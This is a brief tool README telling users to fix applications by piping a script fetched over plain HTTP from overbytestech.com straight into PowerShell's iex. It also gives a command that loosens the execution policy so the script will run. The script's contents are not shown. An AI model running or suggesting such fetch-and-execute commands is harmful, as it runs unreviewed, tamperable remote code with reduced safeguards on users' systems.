This tool provides fixes and access to multiple applications by running

```irm overbytestech.com/repair | iex```

Some servers do not like running this script as it does not use SSL.
To get around this, you can temporarily change the execution policy (for the current session only) by using this command

`Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope Process`
